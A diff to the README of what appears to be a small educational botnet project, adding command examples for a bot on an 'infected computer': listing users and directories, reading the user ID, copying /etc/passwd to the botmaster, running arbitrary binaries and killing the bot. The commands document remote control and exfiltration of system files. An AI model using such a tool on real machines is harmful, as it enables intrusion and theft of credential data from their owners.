@@ -85,6 +85,37 @@ The controller supports the following command-line options:
 | --exec-binary BIN| Execute the specified binary on the bot                            | python bot/controller.py --exec-binary /usr/bin/ps |
 
 You can only use one command option at a time. See the source code for more advanced usage.
+
+#### Examples
+- Ping the bot
+    ```bash
+    python bot/bot.py --announce 
+    ```
+- List users currently present on the infected computer
+    ```bash
+    python bot/bot.py --list-users
+    ```
+- List directories in the specified path (Path should be absolute) 
+    ```bash
+    python bot/bot.py --list-dir /tmp/
+    ```
+- Get the user ID of the Bot (the output of the `id` command) 
+    ```bash
+    python bot/bot.py --user-id
+    ```
+- Copy a file from the infected computer to Botmaster's specified by path (path should be absolute and bot should have permissions to that path). Note: In this, not very wise implementation is the file sent directly in one packet without splitting it into chunks. The output on Botmaster's machine is via console, which is also not very fortunate. 
+    ```bash
+    python bot/bot.py --copy-file /etc/passwd
+    ```
+- Execute a binary specified by path (Path should be absolute and the bot should have permissions to run the binary; binary should be executable) 
+    ```bash
+    python bot/bot.py --exec-binary /usr/bin/ps
+    ```
+- Kill the bot 
+    ```bash
+    python bot/bot.py --kill
+    ```
+
 ## Security Features
 
 - HMAC authentication for all messages
